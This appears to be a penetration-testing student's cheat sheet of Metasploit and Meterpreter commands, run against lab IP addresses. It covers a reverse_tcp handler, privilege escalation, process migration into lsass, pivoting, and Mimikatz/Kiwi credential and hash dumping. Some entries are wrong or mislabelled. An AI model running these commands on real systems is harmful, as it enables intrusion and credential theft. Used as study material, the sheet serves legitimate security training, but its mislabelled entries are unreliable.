
```
### Metasploit Command

> search
> options
> set GHOST (global HOST setting)
> background o bg 

> sessions
> sessions -i 1
> sessions -u 1
> sessions 2


Metasploit Reverse TCP:
> use multi/handler
> set payload windows/meterpreter/reverse_tcp
> set LHOST 10.10.4.2
> set LPORT 1234
> run

Starto postgresql database to store all Metasploit loot:
> /etc/init.d/postgresql start        
or
> service postgresql start && msfconsole -q


# Metasploit - Verify MSF database is connected:
> db_status


# Import nmap scan into MSF
> db_import /root/scan/nmap/windows_server_2012.xml
> hosts
> services



# Load WMAP 
> wmap
> wmap_sites -a 192.157.89.3
> wmap_targets -t http://192.167.89.3
> wmap_sites -l
> wmap_targets -l
> wmap_run -t
> wmap_run -e
> 






```

```
## Meterpreter Command

# Checking current user:
> getuid
> sysinfo


# Elevate High Privilege:
> getsystem 


# Migrare processo:
> ps -S explorer.exe [Explorer.exe - 2896]
> migrate 2896
> migrate -N lssass.exe


# Get Windows Shell:
> shell

# Check if users is member of Administrator groups:
> net localgroup administrators


# MsfConsole - AutoRoute + Scanning Using Autoroute
Devo ruotare tutto il traffico che gira su MSfConsole utilizzando l'ip 192.125.162.2 sul quale ho stabilito una sessione meterpreter
meterpreter > ip a
meterpreter > run autoroute -s 192.125.162.2

CTRL + Z [background session]

> use auxiliary/scanner/portscan/tcp 
> set RHOSTS 192.125.162.3 
> set verbose true
> set ports 1-1000 
> exploit





### Mimikatz Dumping:

# Mimikatz: Upload on Meterpreter shell
meterpreter > upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
> shell

Run mimikatz:
> mimikatz.exe
> lsadump::sam
> lsadump::secrets
> sekurlsa::logonPasswords



### Kiwi - Dumping:
> migrate -N lssass.exe


# Kiwi - Load Kiwi:
> load kiwi


# Kiwi - Dump Administrator NTLM hash:
> creds_all


# Kiwi - Extract All users NTLM hash:
> lsa_dump_sam


# Kiwi - Extract Syskey by dumping LSA secrets:
> lsa_dump_secrets


# Upgrade the sessions to a meterpreter session:
/bin/bash -i






```